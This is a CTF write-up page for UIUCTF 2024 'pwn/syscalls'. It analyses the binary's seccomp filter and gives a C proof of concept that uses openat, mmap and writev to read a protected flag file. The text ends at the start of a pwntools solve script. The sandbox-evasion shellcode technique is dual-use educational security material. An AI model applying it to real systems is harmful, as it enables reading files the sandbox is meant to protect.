<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>UIUCTF 2024 - pwn/syscalls | CTF Writeups</title>
<meta name="keywords" content="">
<meta name="description" content="&lsquo;syscalls&rsquo; was a very neat shellcode with seccomp challenge.
Initial Analysis We are given a binary &lsquo;syscalls&rsquo; and a Dockerfile. First, we take a look at the binary with the file command, and see that it is a stripped 64 bit ELF.
[d@d-20tk001gus syscall]$ file syscalls syscalls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=19b78a52059d384f1b4def02d5838b625773369d, for GNU/Linux 3.2.0, stripped Next we use checksec to see what protections are on.">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/posts/uiuc-ctf-2024-syscalls/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.287d23ee212a39f1ca2dfc362a4cfcc63951b52b214116e1cb5663bb1883333a.css" integrity="sha256-KH0j7iEqOfHKLfw2Kkz8xjlRtSshQRbhy1ZjuxiDMzo=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/uiuc-ctf-2024-syscalls/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="CTF Writeups (Alt + H)">CTF Writeups</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      UIUCTF 2024 - pwn/syscalls
    </h1>
    <div class="post-meta"><span title='2024-07-02 01:07:17 -0400 EDT'>July 2, 2024</span>

</div>
  </header> 
  <div class="post-content"><p>&lsquo;syscalls&rsquo; was a very neat shellcode with seccomp challenge.</p>
<h3 id="initial-analysis">Initial Analysis<a hidden class="anchor" aria-hidden="true" href="#initial-analysis">#</a></h3>
<p>We are given a binary &lsquo;syscalls&rsquo; and a Dockerfile. First, we take a look at the binary with the file command, and see that it is a stripped 64 bit ELF.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>d@d-20tk001gus syscall<span style="color:#f92672">]</span>$ file syscalls
</span></span><span style="display:flex;"><span>syscalls: ELF 64-bit LSB pie executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>19b78a52059d384f1b4def02d5838b625773369d, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, stripped
</span></span></code></pre></div><p>Next we use checksec to see what protections are on. Everyting is on except for the NX bit, meaning the stack is executable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>d@d-20tk001gus syscall<span style="color:#f92672">]</span>$ pwn checksec --file<span style="color:#f92672">=</span>syscalls
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/d/Downloads/uiucCTF24/pwn/syscall/syscalls&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX unknown - GNU_STACK missing
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span><span style="display:flex;"><span>    Stack:    Executable
</span></span><span style="display:flex;"><span>    RWX:      Has RWX segments
</span></span></code></pre></div><h3 id="decompilaiton-with-ghidra">Decompilaiton with Ghidra<a hidden class="anchor" aria-hidden="true" href="#decompilaiton-with-ghidra">#</a></h3>
<p>Because the binary is stripped, we don&rsquo;t have function names. We start at the main function, which calls three functions.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_001011c9</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  undefined local_c8 [<span style="color:#ae81ff">184</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_10;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stderr,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdin,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00101280</span>(local_c8);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_001012db</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_001012ba</span>(local_c8);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The first function tells us that there is file called flag.txt in the same directory as the binary on the remote machine and then uses fgets to read into our buffer local_c8. It reads in less than 184 bytes so we do not have a buffer overflow. The third function takes in local_c8 as a paramenter and executes it as shellcode. But lets take a closer look at the second function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">FUN_001012db</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  undefined2 local_e8 [<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>  undefined8 <span style="color:#f92672">*</span>local_e0;
</span></span><span style="display:flex;"><span>  undefined8 local_d8;
</span></span><span style="display:flex;"><span>  undefined8 local_d0;
</span></span><span style="display:flex;"><span>  undefined8 local_c8;
</span></span><span style="display:flex;"><span>  undefined8 local_c0;
</span></span><span style="display:flex;"><span>  undefined8 local_b8;
</span></span><span style="display:flex;"><span>  undefined8 local_b0;
</span></span><span style="display:flex;"><span>  undefined8 local_a8;
</span></span><span style="display:flex;"><span>  undefined8 local_a0;
</span></span><span style="display:flex;"><span>  undefined8 local_98;
</span></span><span style="display:flex;"><span>  undefined8 local_90;
</span></span><span style="display:flex;"><span>  undefined8 local_88;
</span></span><span style="display:flex;"><span>  undefined8 local_80;
</span></span><span style="display:flex;"><span>  undefined8 local_78;
</span></span><span style="display:flex;"><span>  undefined8 local_70;
</span></span><span style="display:flex;"><span>  undefined8 local_68;
</span></span><span style="display:flex;"><span>  undefined8 local_60;
</span></span><span style="display:flex;"><span>  undefined8 local_58;
</span></span><span style="display:flex;"><span>  undefined8 local_50;
</span></span><span style="display:flex;"><span>  undefined8 local_48;
</span></span><span style="display:flex;"><span>  undefined8 local_40;
</span></span><span style="display:flex;"><span>  undefined8 local_38;
</span></span><span style="display:flex;"><span>  undefined8 local_30;
</span></span><span style="display:flex;"><span>  undefined8 local_28;
</span></span><span style="display:flex;"><span>  undefined8 local_20;
</span></span><span style="display:flex;"><span>  undefined8 local_18;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_10;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
</span></span><span style="display:flex;"><span>  local_d8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400000020</span>;
</span></span><span style="display:flex;"><span>  local_d0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc000003e16000015</span>;
</span></span><span style="display:flex;"><span>  local_c8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>;
</span></span><span style="display:flex;"><span>  local_c0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4000000001000035</span>;
</span></span><span style="display:flex;"><span>  local_b8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff13000015</span>;
</span></span><span style="display:flex;"><span>  local_b0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x120015</span>;
</span></span><span style="display:flex;"><span>  local_a8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x100110015</span>;
</span></span><span style="display:flex;"><span>  local_a0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x200100015</span>;
</span></span><span style="display:flex;"><span>  local_98 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x11000f0015</span>;
</span></span><span style="display:flex;"><span>  local_90 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x13000e0015</span>;
</span></span><span style="display:flex;"><span>  local_88 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x28000d0015</span>;
</span></span><span style="display:flex;"><span>  local_80 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x39000c0015</span>;
</span></span><span style="display:flex;"><span>  local_78 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3b000b0015</span>;
</span></span><span style="display:flex;"><span>  local_70 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x113000a0015</span>;
</span></span><span style="display:flex;"><span>  local_68 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x12700090015</span>;
</span></span><span style="display:flex;"><span>  local_60 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x12800080015</span>;
</span></span><span style="display:flex;"><span>  local_58 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x14200070015</span>;
</span></span><span style="display:flex;"><span>  local_50 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1405000015</span>;
</span></span><span style="display:flex;"><span>  local_48 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1400000020</span>;
</span></span><span style="display:flex;"><span>  local_40 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x30025</span>;
</span></span><span style="display:flex;"><span>  local_38 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3000015</span>;
</span></span><span style="display:flex;"><span>  local_30 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000000020</span>;
</span></span><span style="display:flex;"><span>  local_28 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3e801000025</span>;
</span></span><span style="display:flex;"><span>  local_20 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7fff000000000006</span>;
</span></span><span style="display:flex;"><span>  local_18 <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>;
</span></span><span style="display:flex;"><span>  local_e0 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>local_d8;
</span></span><span style="display:flex;"><span>  local_e8[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x19</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">prctl</span>(<span style="color:#ae81ff">0x26</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">prctl</span>(<span style="color:#ae81ff">0x16</span>,<span style="color:#ae81ff">2</span>,local_e8);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> iVar1;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>prctl stands for &ldquo;Process Control&rdquo; and is used to control various aspects of a process. The first argument passed in tells prctl what to do. I found a few sites online that describe the various flags, but none that map the flags to values. Instead, I looked in prctl.h in /lib and found the values for 0x16 and 0x26 (decimal 22 and 38)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define PR_SET_SECCOMP	22
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>...
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define PR_SET_NO_NEW_PRIVS	38
</span></span></span></code></pre></div><p>PR_SET_NO_NEW_PRIVS	makes it so that the process and its children can&rsquo;t gain new priveldges with somethink like setuid(). Seccomp is a security feature of the linux kernel that can be used to limit what syscalls a process can make.</p>
<h3 id="seccomp-configuration">Seccomp Configuration<a hidden class="anchor" aria-hidden="true" href="#seccomp-configuration">#</a></h3>
<p>Seccomp-tools (<a href="https://github.com/david942j/seccomp-tools">https://github.com/david942j/seccomp-tools</a>) is a very useful tool for secomp analysis. Lets use it to take a look at what these filters are doing.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>d@d-20tk001gus syscall<span style="color:#f92672">]</span>$ seccomp-tools dump ./syscalls
</span></span><span style="display:flex;"><span>The flag is in a file named flag.txt located in the same directory as this binary. That<span style="color:#960050;background-color:#1e0010">&#39;</span>s all the information I can give you.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> line  CODE  JT   JF      K
</span></span><span style="display:flex;"><span><span style="color:#f92672">=================================</span>
</span></span><span style="display:flex;"><span> 0000: 0x20 0x00 0x00 0x00000004  A <span style="color:#f92672">=</span> arch
</span></span><span style="display:flex;"><span> 0001: 0x15 0x00 0x16 0xc000003e  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A !<span style="color:#f92672">=</span> ARCH_X86_64<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0024</span>
</span></span><span style="display:flex;"><span> 0002: 0x20 0x00 0x00 0x00000000  A <span style="color:#f92672">=</span> sys_number
</span></span><span style="display:flex;"><span> 0003: 0x35 0x00 0x01 0x40000000  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A &lt; 0x40000000<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0005</span>
</span></span><span style="display:flex;"><span> 0004: 0x15 0x00 0x13 0xffffffff  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A !<span style="color:#f92672">=</span> 0xffffffff<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0024</span>
</span></span><span style="display:flex;"><span> 0005: 0x15 0x12 0x00 0x00000000  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A <span style="color:#f92672">==</span> read<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0024</span>
</span></span><span style="display:flex;"><span> 0006: 0x15 0x11 0x00 0x00000001  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A <span style="color:#f92672">==</span> write<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0024</span>
</span></span><span style="display:flex;"><span> 0007: 0x15 0x10 0x00 0x00000002  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A <span style="color:#f92672">==</span> open<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0024</span>
</span></span><span style="display:flex;"><span> 0008: 0x15 0x0f 0x00 0x00000011  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A <span style="color:#f92672">==</span> pread64<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0024</span>
</span></span><span style="display:flex;"><span> 0009: 0x15 0x0e 0x00 0x00000013  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A <span style="color:#f92672">==</span> readv<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0024</span>
</span></span><span style="display:flex;"><span> 0010: 0x15 0x0d 0x00 0x00000028  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A <span style="color:#f92672">==</span> sendfile<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0024</span>
</span></span><span style="display:flex;"><span> 0011: 0x15 0x0c 0x00 0x00000039  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A <span style="color:#f92672">==</span> fork<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0024</span>
</span></span><span style="display:flex;"><span> 0012: 0x15 0x0b 0x00 0x0000003b  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A <span style="color:#f92672">==</span> execve<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0024</span>
</span></span><span style="display:flex;"><span> 0013: 0x15 0x0a 0x00 0x00000113  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A <span style="color:#f92672">==</span> splice<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0024</span>
</span></span><span style="display:flex;"><span> 0014: 0x15 0x09 0x00 0x00000127  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A <span style="color:#f92672">==</span> preadv<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0024</span>
</span></span><span style="display:flex;"><span> 0015: 0x15 0x08 0x00 0x00000128  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A <span style="color:#f92672">==</span> pwritev<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0024</span>
</span></span><span style="display:flex;"><span> 0016: 0x15 0x07 0x00 0x00000142  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A <span style="color:#f92672">==</span> execveat<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0024</span>
</span></span><span style="display:flex;"><span> 0017: 0x15 0x00 0x05 0x00000014  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A !<span style="color:#f92672">=</span> writev<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0023</span>
</span></span><span style="display:flex;"><span> 0018: 0x20 0x00 0x00 0x00000014  A <span style="color:#f92672">=</span> fd &gt;&gt; <span style="color:#ae81ff">32</span> <span style="color:#75715e"># writev(fd, vec, vlen)</span>
</span></span><span style="display:flex;"><span> 0019: 0x25 0x03 0x00 0x00000000  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A &gt; 0x0<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0023</span>
</span></span><span style="display:flex;"><span> 0020: 0x15 0x00 0x03 0x00000000  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A !<span style="color:#f92672">=</span> 0x0<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0024</span>
</span></span><span style="display:flex;"><span> 0021: 0x20 0x00 0x00 0x00000010  A <span style="color:#f92672">=</span> fd <span style="color:#75715e"># writev(fd, vec, vlen)</span>
</span></span><span style="display:flex;"><span> 0022: 0x25 0x00 0x01 0x000003e8  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A &lt;<span style="color:#f92672">=</span> 0x3e8<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0024</span>
</span></span><span style="display:flex;"><span> 0023: 0x06 0x00 0x00 0x7fff0000  <span style="color:#66d9ef">return</span> ALLOW
</span></span><span style="display:flex;"><span> 0024: 0x06 0x00 0x00 0x00000000  <span style="color:#66d9ef">return</span> KILL
</span></span></code></pre></div><p>Looking at lines 5 to 16, we can see syscalls that we cannout use. If the syscall is used, KILL is returned and the process will be killed. Unfortunetly for us, some very useful syscalls are blocked. The most straightforward way to print out the contents of a file are using open, read, and write, all of which are blocked! Looking at lines 17 to 22, we can see that writev is not blocked but there are certain restrictions on it. We can use writev, but the file descriptor must be greater than 1000.</p>
<h3 id="exploitation-strategy">Exploitation Strategy<a hidden class="anchor" aria-hidden="true" href="#exploitation-strategy">#</a></h3>
<p>We need to find alternative syscalls for read, write and open. We can use writev instead of write, and there is another syscall openat() which opens a file at a specific location that we can use instead of open. The tricky part of this challenge was finding a syscall that we can use instead of read as readv and pread are also blocked.</p>
<p>After some playing around, I thought that it would be possible to use mmap, but I wasn&rsquo;t sure. I wrote a small c program that used these 3 syscalls, and created a fake flag file in the same directory to see if it would print it out.</p>
<h3 id="proof-of-concept-in-c">Proof of Concept in C<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept-in-c">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/uio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> stat st;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>mapped;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">openat</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">100</span>,<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dup2</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1001</span>);
</span></span><span style="display:flex;"><span>    mapped <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>(NULL, <span style="color:#ae81ff">64</span>, PROT_READ, MAP_PRIVATE, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> iovec iov[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>    iov[<span style="color:#ae81ff">0</span>].iov_base <span style="color:#f92672">=</span> mapped;
</span></span><span style="display:flex;"><span>    iov[<span style="color:#ae81ff">0</span>].iov_len <span style="color:#f92672">=</span> st.st_size;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">writev</span>(<span style="color:#ae81ff">1001</span>, iov, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span></code></pre></div><p>Bingo! First we use opeat to open the flag file. We use dup2 to duplicate fd 1 (standard output) to fd 1001. The first argument passed into mmap is the address for the mapping. When null is passed, the system will chose the address. The second argument is the length in bytes. The 5th argument is the file descriptor, which will be 3, the first available file descriptor which was used by openat. The writev syscall writes to multuple buffers that are iovec objects. An iovec object has a base which is the address we want to write to and and length. Here we map our addres that we got from mmap to iov_base.</p>
<h3 id="final-solve">Final Solve<a hidden class="anchor" aria-hidden="true" href="#final-solve">#</a></h3>
<p>All thats left to do is convert the c code to assembly. Big shoutout to my teammate Xen0s for his help with the assembly conversion. The trickiest part is setting up the iov object. We need 2 pointers, so we can simulate this by pushing the values we need onto the stack. Here is the final solve script with the assembly.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./syscalls&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
